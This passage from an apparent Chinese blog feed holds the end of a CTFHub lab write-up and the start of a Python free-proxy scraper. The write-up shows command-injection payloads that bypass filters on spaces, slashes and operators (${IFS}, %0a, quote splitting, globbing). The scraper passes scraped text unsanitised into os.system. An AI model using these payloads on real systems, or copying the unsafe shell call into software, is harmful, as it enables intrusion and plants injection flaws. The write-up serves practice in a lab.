aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>构建语句</p><pre class="line-numbers language-bash"><code class="language-bash">127.0.0.1<span class="token operator">||</span><span class="token function">cat</span><span class="token variable">${IFS}</span>flag_94782730921038.php127.0.0.1<span class="token operator">||</span><span class="token function">cat</span><span class="token variable">$IFS</span><span class="token variable">$9flag_94782730921038</span>.php127.0.0.1<span class="token operator">||</span>cat<span class="token operator">&lt;</span>flag_94782730921038.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>5440818da520b70a4c68059817197a7a5b5ae17e<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-4、过滤目录分隔符"><a href="#1-4、过滤目录分隔符" class="headerlink" title="1.4、过滤目录分隔符"></a>1.4、过滤目录分隔符</h4><p>​        这次过滤了目录分割符 / ，你能读到 flag 目录下的 flag 文件吗</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#经过探测在flag_is_here下有一个flag_10920239332661.php文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>构造最简单的语句</p><pre class="line-numbers language-bash"><code class="language-bash">127.0.0.1<span class="token punctuation">;</span><span class="token function">cd</span> flag_is_here <span class="token operator">&amp;&amp;</span> <span class="token function">cat</span> flag_10920239332661.php <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到了flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>2bf4ea917a359d1456bcd5ba49d8bfbc35134da6<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-5、过滤运算符"><a href="#1-5、过滤运算符" class="headerlink" title="1.5、过滤运算符"></a>1.5、过滤运算符</h4><p>​        过滤了几个运算符, 要怎么绕过呢</p><img src="https://s1.ax1x.com/2020/04/08/Gfa7OH.png"><p>可以看到仅仅是过滤了几个运算符</p><pre class="line-numbers language-bash"><code class="language-bash">\、<span class="token operator">||</span>、<span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>构造语句</p><pre class="line-numbers language-bash"><code class="language-bash">127.0.0.1<span class="token punctuation">;</span><span class="token function">cat</span> flag_278722724924118.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到了flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>6d341efb911fc84bb36c82ee6f7621ed9fcda26e<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-6、综合过滤"><a href="#1-6、综合过滤" class="headerlink" title="1.6、综合过滤"></a>1.6、综合过滤</h4><p>​        同时过滤了前面几个小节的内容, 如何打出漂亮的组合拳呢?</p><img src="https://s1.ax1x.com/2020/04/08/Gfabmd.png"><p>这下就全过滤了，这里需要用到下面两个</p><pre class="line-numbers language-bash"><code class="language-bash">%0a换行%0d回车<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>构造</p><pre class="line-numbers language-bash"><code class="language-bash">http://challenge-c1f8d7959916b687.sandbox.ctfhub.com:10080/?ip<span class="token operator">=</span>127.0.0.1%0acd<span class="token variable">${IFS}</span>fl<span class="token punctuation">[</span>a-z<span class="token punctuation">]</span>g_is_here%0ac%27%27at<span class="token variable">${IFS}</span><span class="token punctuation">[</span>a-z<span class="token punctuation">]</span>lag*<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>38ba8c2fa7e770b428eaf774e97f5d8ddba2f8e8<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Tips：如果本文章侵犯到您的权益，请通过QQ联系我，我会立刻处理"><a href="#Tips：如果本文章侵犯到您的权益，请通过QQ联系我，我会立刻处理" class="headerlink" title="Tips：如果本文章侵犯到您的权益，请通过QQ联系我，我会立刻处理"></a>Tips：如果本文章侵犯到您的权益，请通过QQ联系我，我会立刻处理</h2><h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续~~"></a>未完待续~~</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Python、CTF、WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Maintain-Agent-Pool</title>
      <link href="/2020/04/07/maintainin-agent-pool/"/>
      <url>/2020/04/07/maintainin-agent-pool/</url>
      
        <content type="html"><![CDATA[<h1 id="Python3维护免费代理池"><a href="#Python3维护免费代理池" class="headerlink" title="Python3维护免费代理池"></a>Python3维护免费代理池</h1><h2 id="一、项目背景"><a href="#一、项目背景" class="headerlink" title="一、项目背景"></a>一、项目背景</h2><p>​        最近在学习Python爬虫，于是想要在网上找一些免费的代理练练手，于是有了这个项目。</p><h2 id="二、项目结构"><a href="#二、项目结构" class="headerlink" title="二、项目结构"></a>二、项目结构</h2><h3 id="1、爬取下面四个站点"><a href="#1、爬取下面四个站点" class="headerlink" title="1、爬取下面四个站点"></a>1、爬取下面四个站点</h3><ul><li>“<a href="https://www.kuaidaili.com/free/inha/&quot;" target="_blank" rel="noopener">https://www.kuaidaili.com/free/inha/"</a></li><li>“<a href="https://www.xicidaili.com/nn/&quot;" target="_blank" rel="noopener">https://www.xicidaili.com/nn/"</a></li><li>“<a href="http://www.66ip.cn/&quot;" target="_blank" rel="noopener">http://www.66ip.cn/"</a></li><li>“<a href="http://www.89ip.cn/index_?.html&quot;" target="_blank" rel="noopener">http://www.89ip.cn/index_?.html"</a></li></ul><h3 id="2、使用百度对爬取到的代理进行检测"><a href="#2、使用百度对爬取到的代理进行检测" class="headerlink" title="2、使用百度对爬取到的代理进行检测"></a>2、使用百度对爬取到的代理进行检测</h3><ul><li><a href="https://www.baidu.com" target="_blank" rel="noopener">https://www.baidu.com</a></li></ul><h3 id="3、将检测出可用的代理保存到-Proxie-txt-中"><a href="#3、将检测出可用的代理保存到-Proxie-txt-中" class="headerlink" title="3、将检测出可用的代理保存到 Proxie.txt 中"></a>3、将检测出可用的代理保存到 <code>Proxie.txt</code> 中</h3><h2 id="三、项目代码"><a href="#三、项目代码" class="headerlink" title="三、项目代码"></a>三、项目代码</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token comment" spellcheck="true"># Edit time: 2020/4/5 19:04</span><span class="token keyword">from</span> requests <span class="token keyword">import</span> RequestException<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> urllib3<span class="token keyword">import</span> requests<span class="token keyword">import</span> random<span class="token keyword">import</span> time<span class="token keyword">import</span> re<span class="token keyword">import</span> sys<span class="token keyword">import</span> osurllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>urllib3<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InsecureRequestWarning<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_user_agent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_agent <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span>    <span class="token punctuation">]</span>    header <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>user_agent<span class="token punctuation">)</span>    <span class="token keyword">return</span> header<span class="token keyword">class</span> <span class="token class-name">MaintainProxyPool</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>kuai_proxy <span class="token operator">=</span> <span class="token string">"https://www.kuaidaili.com/free/inha/"</span>        self<span class="token punctuation">.</span>xici_proxy <span class="token operator">=</span> <span class="token string">"https://www.xicidaili.com/nn/"</span>        self<span class="token punctuation">.</span>ip66_proxy <span class="token operator">=</span> <span class="token string">"http://www.66ip.cn/"</span>        self<span class="token punctuation">.</span>ip89_proxy <span class="token operator">=</span> <span class="token string">"http://www.89ip.cn/index_"</span>        self<span class="token punctuation">.</span>check_proxy <span class="token operator">=</span> <span class="token string">'https://www.baidu.com'</span>        self<span class="token punctuation">.</span>header <span class="token operator">=</span> get_user_agent<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>total_website <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>merge_infos <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>kuai_infos <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>xici_infos <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>ip66_infos <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>ip89_infos <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>active_infos <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>alive_site <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">get_kuai_proxy</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t[..] 开始爬取kuai代理的代理"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\t[.] 开始爬取第%d页的代理信息"</span> <span class="token operator">%</span> i<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 154</span>            url <span class="token operator">=</span> self<span class="token punctuation">.</span>kuai_proxy <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/"</span>            header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>header<span class="token punctuation">}</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>            <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>                <span class="token keyword">pass</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span>                html <span class="token operator">=</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'tr'</span><span class="token punctuation">)</span>                <span class="token keyword">for</span> index <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>kuai_infos<span class="token punctuation">.</span>append<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"&lt;td data.*?>(.*)&lt;/td>"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>html<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\t[+] 爬取完成！本次爬取的代理信息共 %d 条"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>kuai_infos<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_xici_proxy</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t[..] 开始爬取xici的代理"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\t[.] 开始爬取第%d页的代理信息"</span> <span class="token operator">%</span> i<span class="token punctuation">)</span>            url <span class="token operator">=</span> self<span class="token punctuation">.</span>xici_proxy <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>header<span class="token punctuation">}</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>            <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>                <span class="token keyword">pass</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span>                html <span class="token operator">=</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'tr'</span><span class="token punctuation">)</span>                <span class="token keyword">for</span> index <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>xici_infos<span class="token punctuation">.</span>append<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"&lt;td>(.*)&lt;/td>"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>html<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\t[+] 爬取完成！本次爬取的代理信息共 %d 条"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>xici_infos<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_ip66_proxy</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t[..] 开始爬取ip66的代理"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            url <span class="token operator">=</span> self<span class="token punctuation">.</span>ip66_proxy <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".html"</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\t[.] 开始爬取第%d页的代理信息"</span> <span class="token operator">%</span> i<span class="token punctuation">)</span>            header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>header<span class="token punctuation">}</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>            <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>                <span class="token keyword">pass</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                res<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'gbk'</span>                soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span>                html <span class="token operator">=</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'tr'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                <span class="token keyword">for</span> index <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>ip66_infos<span class="token punctuation">.</span>append<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"&lt;td>(.*?)&lt;/td>"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>html<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\t[+] 爬取完成！本次爬取的代理信息共 %d 条"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>ip66_infos<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_ip89_proxy</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t[..] 开始爬取ip89的代理"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            url <span class="token operator">=</span> self<span class="token punctuation">.</span>ip89_proxy <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".html"</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\t[.] 开始爬取第%d页的代理信息"</span> <span class="token operator">%</span> i<span class="token punctuation">)</span>            header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>header<span class="token punctuation">}</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>            <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>                <span class="token keyword">pass</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span>                html <span class="token operator">=</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'tr'</span><span class="token punctuation">)</span>                <span class="token keyword">for</span> index <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>ip89_infos<span class="token punctuation">.</span>append<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"&lt;td>\s*(.*)\t\t&lt;/td>"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>html<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\t[+] 爬取完成！本次爬取的代理信息共 %d 条"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>ip89_infos<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">detect_open</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>total_website<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>ip89_proxy <span class="token operator">+</span> <span class="token string">"1.html"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>total_website<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>ip66_proxy<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>total_website<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>xici_proxy<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>total_website<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>kuai_proxy<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[..] 开始检测预定义的 %d 个站点是否可用"</span> <span class="token operator">%</span> len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>total_website<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> website <span class="token keyword">in</span> self<span class="token punctuation">.</span>total_website<span class="token punctuation">:</span>            header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>header<span class="token punctuation">}</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>website<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>            <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>                <span class="token keyword">pass</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>alive_site<span class="token punctuation">.</span>append<span class="token punctuation">(</span>website<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">merge_proxy</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>merge_infos <span class="token operator">=</span> self<span class="token punctuation">.</span>ip66_infos <span class="token operator">+</span> self<span class="token punctuation">.</span>kuai_infos <span class="token operator">+</span> self<span class="token punctuation">.</span>xici_infos <span class="token operator">+</span> self<span class="token punctuation">.</span>ip89_infos        infos <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> merge_info <span class="token keyword">in</span> self<span class="token punctuation">.</span>merge_infos<span class="token punctuation">:</span>            infos<span class="token punctuation">.</span>append<span class="token punctuation">(</span>merge_info<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> merge_info<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>merge_infos <span class="token operator">=</span> list<span class="token punctuation">(</span>set<span class="token punctuation">(</span>infos<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">check_active</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[..] 开始对爬取到的代理进行检测..."</span><span class="token punctuation">)</span>        header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>header<span class="token punctuation">}</span>        <span class="token keyword">for</span> ip_list <span class="token keyword">in</span> self<span class="token punctuation">.</span>merge_infos<span class="token punctuation">:</span>            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"echo 正在测试：%s的可用性 >> test.log"</span> <span class="token operator">%</span> ip_list<span class="token punctuation">)</span>            proxies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"https"</span><span class="token punctuation">:</span> <span class="token string">"https://"</span> <span class="token operator">+</span> ip_list<span class="token punctuation">,</span> <span class="token string">"http"</span><span class="token punctuation">:</span> <span class="token string">"http://"</span> <span class="token operator">+</span> ip_list<span class="token punctuation">}</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>check_proxy<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxies<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>                <span class="token keyword">pass</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token 